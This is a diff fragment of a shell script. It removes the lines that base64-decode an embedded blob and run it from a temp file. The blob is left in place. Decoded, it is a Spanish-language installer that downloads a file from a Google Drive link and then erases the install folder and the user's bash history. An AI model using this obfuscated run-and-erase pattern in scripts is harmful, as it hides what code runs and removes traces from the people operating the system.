@@ -5,8 +5,6 @@
 # 
 #
 #
-CesarHackGray=$(mktemp)
-base64 -d  >${CesarHackGray}<<DIXIE
 IyEvYmluL2Jhc2gKY2xlYXIKcGtpbGwgLWYgd3MtZXBybwplY2hvIElOU1RBTEFORE8gUEhZVE9O
 IE5VRVZPCnNsZWVwIDEKY2QKCiNJbnN0YWxsIHdzLWVwcm8Kd2dldCAtcSAtLXNob3ctcHJvZ3Jl
 c3MgLS1sb2FkLWNvb2tpZXMgL3RtcC9jb29raWVzLnR4dCAiaHR0cHM6Ly9kb2NzLmdvb2dsZS5j
@@ -88,6 +86,3 @@ byAtZSAiJHtOQ30iCnJtIC1yZiBpbnN0YWxsLXdzICYmIGNhdCAvZGV2L251bGwgPiB+Ly5iYXNo
 X2hpc3RvcnkgJiYgaGlzdG9yeSAtYwplY2hvIC1uZSAiXG5cMDMzWzE7MzFtRU5URVIgXDAzM1sx
 OzMzbXBhcmEgZW50cmFyIGFsIFwwMzNbMTszMm1NRU5VIVwwMzNbMG0iOyByZWFkCiAgIG1lbnUK
 ICAgCiAgIGZpCg==
-DIXIE
-source ${CesarHackGray}
-rm -rf ${CesarHackGray}
